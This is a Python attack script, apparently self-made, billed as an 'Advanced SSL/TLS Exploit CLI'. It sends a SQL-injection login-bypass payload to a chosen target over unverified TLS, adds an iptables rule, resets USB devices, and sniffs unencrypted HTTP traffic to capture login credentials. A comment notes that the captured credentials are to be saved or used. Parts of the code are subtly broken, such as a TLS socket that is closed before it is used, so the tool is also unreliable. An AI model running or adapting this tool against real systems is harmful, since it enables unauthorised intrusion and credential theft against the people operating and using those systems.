import socket
import ssl
import os
import logging
import argparse
import usb.core
import usb.util
from scapy.all import sniff, TCP, IP
import subprocess

# Tentukan jalur log
log_dir = os.path.join(os.path.expanduser("~"), "OneDrive", "Documents", "Syber 266")
log_file = os.path.join(log_dir, "exploit.log")

# Buat direktori log jika belum ada
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def ssl_handshake(target_ip, target_port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.options |= ssl.OP_NO_SSLv2
    context.options |= ssl.OP_NO_SSLv3

    with socket.create_connection((target_ip, target_port)) as sock:
        with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
            logging.info("SSL handshake completed with %s:%d", target_ip, target_port)
            return ssock

def exploit_ssl(target_ip, target_port):
    try:
        ssock = ssl_handshake(target_ip, target_port)
        payload = generate_custom_payload("/login", "username=admin&password=admin' OR '1'='1")
        ssock.send(payload)
        response = ssock.recv(4096)
        logging.info("Received response: %s", response.decode('utf-8'))
    except ssl.SSLError as ssl_error:
        logging.error("SSL error occurred: %s", ssl_error)
    except socket.error as sock_error:
        logging.error("Socket error occurred: %s", sock_error)
    except Exception as e:
        logging.error("An unexpected error occurred: %s", e)

def generate_custom_payload(target_url, login_data):
    payload = f"POST {target_url} HTTP/1.1\r\n"
    payload += "Host: target\r\n"
    payload += "Content-Length: {}\r\n".format(len(login_data))
    payload += "Content-Type: application/x-www-form-urlencoded\r\n"
    payload += "\r\n"
    payload += login_data
    return payload.encode('utf-8')

def send_payload(target_ip, target_port, payload):
    with socket.create_connection((target_ip, target_port)) as sock:
        sock.send(payload)
        response = sock.recv(4096)
        logging.info("Received response: %s", response.decode('utf-8'))

def list_usb_devices():
    devices = usb.core.find(find_all=True)
    device_list = []
    for device in devices:
        device_info = {
            'idVendor': hex(device.idVendor),
            'idProduct': hex(device.idProduct),
            'serial_number': usb.util.get_string(device, device.iSerialNumber),
            'manufacturer': usb.util.get_string(device, device.iManufacturer),
            'product': usb.util.get_string(device, device.iProduct)
        }
        device_list.append(device_info)
    return device_list

def manipulate_usb_device(vendor_id, product_id, action='reset'):
    device = usb.core.find(idVendor=vendor_id, idProduct=product_id)
    if device is None:
        raise ValueError("Device not found")
    
    if action == 'reset':
        device.reset()
        logging.info(f"Device {vendor_id}:{product_id} reset successfully")
    elif action == 'detach_kernel_driver':
        if device.is_kernel_driver_active(0):
            device.detach_kernel_driver(0)
            logging.info(f"Kernel driver detached for device {vendor_id}:{product_id}")
    # Tambahkan aksi lain sesuai kebutuhan

def perform_advanced_bypass(target_ip, target_port):
    try:
        subprocess.run(['iptables', '-A', 'OUTPUT', '-p', 'tcp', '--dport', str(target_port), '-j', 'ACCEPT'], check=True)
        payload = generate_custom_payload("/login", "username=admin&password=admin' OR '1'='1")
        send_payload(target_ip, target_port, payload)
        logging.info("Advanced bypass performed successfully")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to perform advanced bypass: {e}")

def sniff_auto_login(interface='eth0'):
    def process_packet(packet):
        if packet.haslayer(TCP) and packet[TCP].dport == 80:
            payload = bytes(packet[TCP].payload)
            if b"login" in payload and b"password" in payload:
                logging.info(f"Auto login detected: {payload.decode('utf-8')}")
                # Simpan atau gunakan kredensial yang ditemukan

    sniff(iface=interface, prn=process_packet, store=False)

def perform_auto_login(target_ip, target_port, credentials):
    payload = generate_custom_payload("/login", credentials)
    send_payload(target_ip, target_port, payload)

def main():
    parser = argparse.ArgumentParser(description='Advanced SSL/TLS Exploit CLI')
    parser.add_argument('--target-ip', type=str, required=True, help='IP address of the target')
    parser.add_argument('--target-port', type=int, required=True, help='Port of the target')
    parser.add_argument('--usb-vendor-id', type=str, required=False, help='USB vendor ID')
    parser.add_argument('--usb-product-id', type=str, required=False, help='USB product ID')

    args = parser.parse_args()

    if args.usb_vendor_id and args.usb_product_id:
        manipulate_usb_device(int(args.usb_vendor_id, 16), int(args.usb_product_id, 16), action='reset')

    perform_advanced_bypass(args.target_ip, args.target_port)
    sniff_auto_login()

    exploit_ssl(args.target_ip, args.target_port)

if __name__ == "__main__":
    main()
